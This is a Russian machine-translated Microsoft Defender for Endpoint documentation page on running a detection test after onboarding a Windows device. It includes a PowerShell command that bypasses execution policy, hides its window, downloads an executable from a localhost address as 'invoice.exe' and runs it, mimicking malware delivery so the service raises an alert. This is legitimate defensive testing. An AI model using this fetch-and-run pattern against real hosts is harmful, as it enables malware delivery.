---
title: Запустите тест обнаружения на недавно созданном устройстве Microsoft Defender для конечных точек
description: Запустите сценарий обнаружения на недавно созданном устройстве, чтобы убедиться, что он правильно вошел в службу Microsoft Defender для конечной точки.
keywords: тест обнаружения, обнаружение, powerhell, script, verify, onboarding, microsoft defender для onboarding конечной точки, клиенты, серверы, тест
search.product: eADQiWindows 10XVcnh
search.appverid: met150
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
ms.author: macapara
author: mjcaparas
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- m365-security-compliance
- m365initiative-defender-endpoint
ms.topic: article
ms.technology: mde
ms.openlocfilehash: 89b8ac7d99cfcd4c5e5e647e5ba54e14184ef0bd
ms.sourcegitcommit: 3fe7eb32c8d6e01e190b2b782827fbadd73a18e6
ms.translationtype: MT
ms.contentlocale: ru-RU
ms.lasthandoff: 04/13/2021
ms.locfileid: "51688121"
---
# <a name="run-a-detection-test-on-a-newly-onboarded-microsoft-defender-for-endpoint-device"></a>Запустите тест обнаружения на недавно созданном устройстве Microsoft Defender для конечных точек 

[!INCLUDE [Microsoft 365 Defender rebranding](../../includes/microsoft-defender.md)]


**Область применения:**
- Поддерживаемые версии Windows 10
- Windows Server 2012 R2
- Windows Server 2016
- Windows Server, версия 1803
- Windows Server, 2019 г.
- [Microsoft Defender для конечной точки](https://go.microsoft.com/fwlink/?linkid=2154037)
- [Microsoft 365 Defender](https://go.microsoft.com/fwlink/?linkid=2118804)

> Хотите испытать Microsoft Defender для конечной точки? [Зарегистрився для бесплатной пробной.](https://www.microsoft.com/microsoft-365/windows/microsoft-defender-atp?ocid=docs-wdatp-exposedapis-abovefoldlink)

Запустите следующий скрипт PowerShell на новом устройстве, чтобы убедиться, что он должным образом передается в службу Защитник для конечных точек.

1. Создайте папку: "C:\test-MDATP-test".
2. Откройте повышенную командную строку на устройстве и запустите сценарий:

   1. В меню **Пуск** введите **cmd**.

   1. Щелкните правой **кнопкой мыши командный запрос** и выберите **Выполнить в качестве администратора.**

      ![Меню Пуск окна, указывав на запуск в качестве администратора](images/run-as-admin.png)

3. По запросу скопируйте и запустите следующую команду:

   ```powershell
   powershell.exe -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http://127.0.0.1/1.exe', 'C:\\test-MDATP-test\\invoice.exe');Start-Process 'C:\\test-MDATP-test\\invoice.exe'
   ```

Окно Командная подсказка закрывается автоматически. В случае успешного завершения тест обнаружения будет отмечен как завершенный, и через 10 минут на портале для бортового устройства появится новое оповещение.

## <a name="related-topics"></a>Статьи по теме
- [Подключение устройств Windows 10](configure-endpoints.md)
- [Серверы на борту](configure-server-endpoints.md)
- [Устранение неполадок в Microsoft Defender для проблем с бортовой точкой конечной точки](https://docs.microsoft.com/microsoft-365/security/defender-endpoint/troubleshoot-onboarding)
